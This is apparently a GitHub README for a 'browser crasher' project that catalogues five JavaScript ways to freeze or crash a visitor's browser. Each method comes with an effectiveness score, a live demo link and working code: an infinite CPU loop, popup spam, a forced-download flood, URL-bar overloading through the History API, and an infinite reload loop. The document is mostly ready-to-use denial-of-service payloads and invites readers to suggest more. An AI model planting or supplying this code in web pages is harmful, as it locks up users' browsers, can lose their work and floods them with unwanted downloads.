# Browser crasher

This repository provides several ways to crash/freeze the browser. Some of these methods can break the current tab (which requires reloading), while others target the entire browser.
As practice has shown, Chromium-based browsers are more vulnerable to various attacks than Firefox. The whole application is being affected, not just a single tab.

### CPU-bound Infinite Loop 10/10
The most reliable way to completely freeze a page. Works in any browser. Basically forces a user to close the page.
[OPEN](https://murka007.github.io/browser-crasher/?type=0)
```js
for(;;){}
```

### Window Opener 2/10
Opens multiple popups on the page and fills history, which drastically increases memory and cpu usage. Doesn't work if user has `block popups` option enabled.
[OPEN](https://murka007.github.io/browser-crasher/?type=1)
```js
setInterval(() => {
    window.open("", "", "width=1,height=1");
}, 10);
```


### Download Popup Opener 7/10
Almost the same method as `Window Opener`, but this approach is more consistent among all browsers.
[OPEN](https://murka007.github.io/browser-crasher/?type=2)
```js
const download = (text) => {
    const blob = new Blob([text], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.href = url;
    link.download = "LOL.txt";

    document.body.appendChild(link);
    link.click();

    document.body.removeChild(link);
    URL.revokeObjectURL(url);
}

setInterval(() => {
    download("not happy about you");
}, 50);
```


### URL bar overloading 5/10
Abuses `History API` and fills URL bar with insanely large values.
[OPEN](https://murka007.github.io/browser-crasher/?type=3)
```js
const total = "0".repeat(999999);
setInterval(() => {
    history.pushState(0, 0, total);
}, 50);
```


### Infinite Reload Attack 1/10
Reloads the page multiple times. Firefox has protection against it.
[OPEN](https://murka007.github.io/browser-crasher/?type=4)
```js
window.onbeforeunload = function() {
    // additional attack vector
    localStorage.x = 1;
}

setTimeout(() => {
    for(;;) location.reload(1);
}, 100);
```

If you know other ways to do this, feel free to suggest!